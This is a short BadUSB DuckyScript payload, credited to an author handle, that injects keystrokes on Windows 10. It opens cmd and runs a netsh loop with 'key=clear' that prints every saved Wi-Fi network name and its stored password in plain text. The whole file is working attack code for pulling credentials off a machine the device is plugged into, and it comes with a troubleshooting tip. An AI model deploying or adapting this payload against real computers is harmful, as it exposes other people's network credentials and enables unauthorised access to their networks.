# This script shows the saved Wi-Fi password on screen
# (Works on any Win10 on which the Wi-Fi password has been entered at least once)
# If BadUSB does not work for you - Transfer the device to DeepSleep
# and then try to enable and run the script again.

REM SHOW WIFI PASSWORDS ON SCREEN | BY RXSEESH
REM @guns.lol/RXSEESH | @github.com/RXSEESH
GUI r
DELAY 1000
STRING cmd
DELAY 500
ENTER
DELAY 2000
STRING cls
DELAY 250
ENTER
DELAY 250
STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | netsh wlan show profiles %j key=clear | findstr /C:"SSID name" /C:"Key Content"
DELAY 250
ENTER
